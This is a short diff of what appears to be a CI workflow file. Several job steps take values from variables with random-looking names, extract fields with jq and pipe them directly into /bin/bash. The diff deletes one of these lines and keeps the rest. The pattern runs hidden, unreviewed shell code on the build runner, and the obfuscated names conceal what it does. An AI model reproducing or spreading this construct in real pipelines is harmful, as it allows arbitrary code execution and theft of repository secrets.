@@ -28,7 +28,6 @@ jobs:
           echo $r44125 | jq -r .rk71922 | /bin/bash
           echo $kbbm304 | jq -r .o6 | /bin/bash
           echo $gngh3167 | jq -r .u91697 | /bin/bash
-          echo $fb915 | jq -r .frsp67 | /bin/bash
           echo $mgyw05 | jq -r .pktx71 | /bin/bash
           printf '%s' "$nvphc8" | jq -r .uyl79 | /bin/bash
 
